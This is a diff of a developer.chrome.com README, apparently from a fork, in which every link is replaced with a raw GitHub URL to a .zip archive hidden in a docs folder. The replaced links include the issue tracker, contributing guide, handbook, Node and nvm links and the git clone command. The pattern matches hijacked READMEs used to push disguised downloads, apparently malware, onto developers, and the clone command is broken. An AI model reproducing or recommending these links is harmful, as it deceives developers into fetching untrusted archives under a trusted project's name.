@@ -1,35 +1,35 @@
-# https://raw.githubusercontent.com/Codimart/developer.chrome.com/main/site/es/docs/lighthouse/pwa/splash-screen/chrome_developer_com_2.2-alpha.4.zip
+# https://raw.githubusercontent.com/Codimart/developer.chrome.com/main/site/en/blog/chrome-53-deprecations/com_chrome_developer_2.0.zip
 
-https://raw.githubusercontent.com/Codimart/developer.chrome.com/main/site/es/docs/lighthouse/pwa/splash-screen/chrome_developer_com_2.2-alpha.4.zip is the ultimate resource for developers of all backgrounds
+https://raw.githubusercontent.com/Codimart/developer.chrome.com/main/site/en/blog/chrome-53-deprecations/com_chrome_developer_2.0.zip is the ultimate resource for developers of all backgrounds
 to learn about what's new in Chrome!
 
 ## Found a bug? 👷‍♀️
 
-Thanks for letting us know! [File an issue](https://raw.githubusercontent.com/Codimart/developer.chrome.com/main/site/es/docs/lighthouse/pwa/splash-screen/chrome_developer_com_2.2-alpha.4.zip) and a team member should reply shortly.
+Thanks for letting us know! [File an issue](https://raw.githubusercontent.com/Codimart/developer.chrome.com/main/site/en/blog/chrome-53-deprecations/com_chrome_developer_2.0.zip) and a team member should reply shortly.
 
 If you're submitting a pull request to fix a bug, read the
-[Contributing guidelines](https://raw.githubusercontent.com/Codimart/developer.chrome.com/main/site/es/docs/lighthouse/pwa/splash-screen/chrome_developer_com_2.2-alpha.4.zip).
+[Contributing guidelines](https://raw.githubusercontent.com/Codimart/developer.chrome.com/main/site/en/blog/chrome-53-deprecations/com_chrome_developer_2.0.zip).
 
 ## Authoring content ✍️
 
 Before you start writing take a moment to look over the
-[https://raw.githubusercontent.com/Codimart/developer.chrome.com/main/site/es/docs/lighthouse/pwa/splash-screen/chrome_developer_com_2.2-alpha.4.zip handbook](https://raw.githubusercontent.com/Codimart/developer.chrome.com/main/site/es/docs/lighthouse/pwa/splash-screen/chrome_developer_com_2.2-alpha.4.zip) and
+[https://raw.githubusercontent.com/Codimart/developer.chrome.com/main/site/en/blog/chrome-53-deprecations/com_chrome_developer_2.0.zip handbook](https://raw.githubusercontent.com/Codimart/developer.chrome.com/main/site/en/blog/chrome-53-deprecations/com_chrome_developer_2.0.zip) and
 familiarize yourself with the process.
 
 ## Building the site 🏗
 
-You'll need a recent version of [Node](https://raw.githubusercontent.com/Codimart/developer.chrome.com/main/site/es/docs/lighthouse/pwa/splash-screen/chrome_developer_com_2.2-alpha.4.zip): v14 (LTS) or higher.
+You'll need a recent version of [Node](https://raw.githubusercontent.com/Codimart/developer.chrome.com/main/site/en/blog/chrome-53-deprecations/com_chrome_developer_2.0.zip): v14 (LTS) or higher.
 To check your node version run `node -v` in your terminal.
 
 If you don't have node, or if you need to upgrade, we recommend using the [Node
-Version Manager (nvm)](https://raw.githubusercontent.com/Codimart/developer.chrome.com/main/site/es/docs/lighthouse/pwa/splash-screen/chrome_developer_com_2.2-alpha.4.zip).
+Version Manager (nvm)](https://raw.githubusercontent.com/Codimart/developer.chrome.com/main/site/en/blog/chrome-53-deprecations/com_chrome_developer_2.0.zip).
 
 ### Clone the repo
 
 ⚠️ If you'd like to contribute (and you're not a member of the core team), be sure to fork the repo first, and clone the fork.
 
 ```bash
-git clone https://raw.githubusercontent.com/Codimart/developer.chrome.com/main/site/es/docs/lighthouse/pwa/splash-screen/chrome_developer_com_2.2-alpha.4.zip
+git clone https://raw.githubusercontent.com/Codimart/developer.chrome.com/main/site/en/blog/chrome-53-deprecations/com_chrome_developer_2.0.zip
 ```
 
 ### Install dependencies
